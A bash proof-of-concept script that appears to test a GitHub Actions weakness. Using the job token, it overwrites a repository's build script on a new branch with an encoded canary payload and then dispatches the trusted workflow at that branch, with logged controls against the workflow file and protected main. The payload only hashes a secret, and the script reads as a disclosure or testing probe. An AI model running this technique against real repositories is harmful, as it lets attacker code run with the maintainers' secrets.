#!/usr/bin/env bash
set -uo pipefail
if [ -z "${GITHUB_TOKEN:-}" ]; then
  echo "GX|VOID|GITHUB_TOKEN-EMPTY-IN-ENV - every result below is meaningless"; echo "GX|DONE"; exit 0
fi
echo "GX|EVENT|${GITHUB_EVENT_NAME:-?}|REF|${GITHUB_REF:-?}|RUN|${GITHUB_RUN_ID:-?}"
API=https://api.github.com/repos/kovac-labs/zz-mq-tok-1027
ATK_B64='IyEvdXNyL2Jpbi9lbnYgYmFzaAojIFdyaXR0ZW4gYnkgdGhlIG1lcmdlX2dyb3VwIEdJVEhVQl9UT0tFTi4gQXV0aG9yZWQgYnkgYSBub24tY29sbGFib3JhdG9yLiBOZXZlciByZXZpZXdlZCBieSBhbnlvbmUuCmVjaG8gIlRCfFZFUlNJT049QVRUQUNLRVItU1VQUExJRUQtTkVWRVItUkVWSUVXRUR8cmVmPSR7R0lUSFVCX1JFRjotP318ZXZlbnQ9JHtHSVRIVUJfRVZFTlRfTkFNRTotP318cnVuPSR7R0lUSFVCX1JVTl9JRDotP30iCnByaW50ZiAnVEJ8U0VDUkVUfGxlbj0lcyBzaGEyNTYtMTY9JXNcbicgIiR7I1N9IiAiJChwcmludGYgJXMgIiR7UzotfSIgfCBzaGEyNTZzdW0gfCBjdXQgLWMxLTE2KSIKZWNobyAiVEJ8V0hPQU1JfHRoZSB3b3JrZmxvdyBmaWxlIGV4ZWN1dGluZyBtZSBpcyB0aGUgbWFpbnRhaW5lcnMsIGJ5dGUtdW5tb2RpZmllZDsgb25seSB0aGlzIHNjcmlwdCBkaWZmZXJzIgo='
api () { curl -s -o /tmp/o -w '%{http_code}' -X "$1" -H "Authorization: Bearer ${GITHUB_TOKEN}" \
         -H 'Accept: application/vnd.github+json' ${3:+-d "$3"} "$API$2"; }
j () { python3 -c "import json;d=json.load(open('/tmp/o'));print(d$1)" 2>/dev/null || echo PARSE-FAIL; }
body () { head -c "${1:-200}" /tmp/o | tr -d '\n'; }

WF=".github/workflows/trusted-build.yml"
SCRIPT="scripts/ci-build.sh"
BR="gx-${GITHUB_RUN_ID}"

S=$(api GET "/git/ref/heads/main"); MAINSHA=$(j "['object']['sha']")
echo "GX|MAIN|http=${S}|sha=${MAINSHA:0:12}"
S=$(api GET "/contents/${WF}?ref=main"); WF_MAIN=$(j "['sha']")
echo "GX|WORKFLOW-BLOB-ON-MAIN|http=${S}|sha=${WF_MAIN}"
S=$(api GET "/contents/${SCRIPT}?ref=main"); SC_MAIN=$(j "['sha']")
echo "GX|SCRIPT-BLOB-ON-MAIN|http=${S}|sha=${SC_MAIN}"

S=$(api POST "/git/refs" "{\"ref\":\"refs/heads/${BR}\",\"sha\":\"${MAINSHA}\"}")
echo "GX|CREATE-REF|${BR}|http=${S}|$(body 120)"

# 1. ARM: overwrite the repository's own build script on that branch. NOT a workflow file.
S=$(api PUT "/contents/${SCRIPT}" "{\"message\":\"gx: attacker build script\",\"content\":\"${ATK_B64}\",\"branch\":\"${BR}\",\"sha\":\"${SC_MAIN}\"}")
echo "GX|WRITE-BUILD-SCRIPT|path=${SCRIPT}|branch=${BR}|http=${S}|$(body 150)"

# 2. POSITIVE CONTROL: the same token, same branch, the WORKFLOW file. The guard must fire here.
S=$(api PUT "/contents/${WF}" "{\"message\":\"gx: attacker workflow edit\",\"content\":\"${ATK_B64}\",\"branch\":\"${BR}\",\"sha\":\"${WF_MAIN}\"}")
echo "GX|POSITIVE-CONTROL-workflow-file-same-branch|http=${S}|$(body 150)"

# 3. REACH CONTROL: the same non-workflow write against PROTECTED main.
S=$(api PUT "/contents/${SCRIPT}" "{\"message\":\"gx: attacker build script on main\",\"content\":\"${ATK_B64}\",\"branch\":\"main\",\"sha\":\"${SC_MAIN}\"}")
echo "GX|REACH-CONTROL-protected-main|http=${S}|$(body 220)"

# 4. THE DISCRIMINATOR: the workflow blob at the attacker ref must be BYTE-IDENTICAL to main's.
S=$(api GET "/contents/${WF}?ref=${BR}"); WF_BR=$(j "['sha']")
echo "GX|WORKFLOW-BLOB-ON-ATTACKER-REF|http=${S}|sha=${WF_BR}"
if [ "${WF_BR}" = "${WF_MAIN}" ]; then echo "GX|DISCRIMINATOR|WORKFLOW-FILE-IS-UNMODIFIED|identical=${WF_MAIN}"
else echo "GX|DISCRIMINATOR|WORKFLOW-FILE-DIFFERS-ARM-IS-VOID|main=${WF_MAIN}|branch=${WF_BR}"; fi
S=$(api GET "/contents/${SCRIPT}?ref=${BR}"); echo "GX|SCRIPT-BLOB-ON-ATTACKER-REF|http=${S}|sha=$(j "['sha']")"

# 5. fire the MAINTAINER'S OWN workflow at the attacker's ref, and at main as the control
S=$(api POST "/actions/workflows/trusted-build.yml/dispatches" "{\"ref\":\"${BR}\"}")
echo "GX|DISPATCH-ARM|ref=${BR}|http=${S}|$(body 150)"
S=$(api POST "/actions/workflows/trusted-build.yml/dispatches" "{\"ref\":\"main\"}")
echo "GX|DISPATCH-CONTROL|ref=main|http=${S}|$(body 150)"
echo "GX|DONE"
